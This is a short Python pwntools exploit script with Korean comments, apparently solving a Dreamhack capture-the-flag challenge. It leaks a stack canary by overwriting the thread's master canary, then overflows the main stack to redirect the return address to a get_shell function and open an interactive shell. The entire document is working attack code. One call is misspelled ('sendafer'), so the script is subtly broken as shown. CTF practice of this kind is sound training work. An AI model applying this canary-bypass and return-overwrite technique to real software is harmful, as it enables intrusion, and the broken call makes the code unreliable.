from pwn import *

p = remote('host3.dreamhack.games', 20953)
elf = ELF('./master.self')

#get_shell 주소 가져오기, no pie라 가능
shell = elf.symbols['get_shell'] + 1


#마스터 카나리 까지의 거리 및 스택-카나리까지의 거리 세팅
master_offset = 0x938
main_offset = 0x28

#실행, 스레드를 생성함
p.sendlineafter(b"> ", b"1")

#실행, 마스터 카나리 조작
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Size: ", str(master_offset+1).encode())
payload1 = b"A" * master_offset + b"B"

p.sendafer(b"Data: ", payload1)
p.recvuntil(b"Data: ")
p.recv(master_offset)

leak = p.recvn(7)
canary = u64(b"\x00" + leak)

log.info(canary)


#메인스택 오버플로우와 ret값 변조
p.sendlineafter(b"> ", b"3")

payload2 = b"A" * main_offset
payload2 += p64(canary)
payload2 += b"A" * 8 #더미(SFP)
payload2 += p64(shell) #리턴 주소를 get_shell주소로 바꿈

p.sendafter(b"Leave comment: ", payload2)

p.interactive()
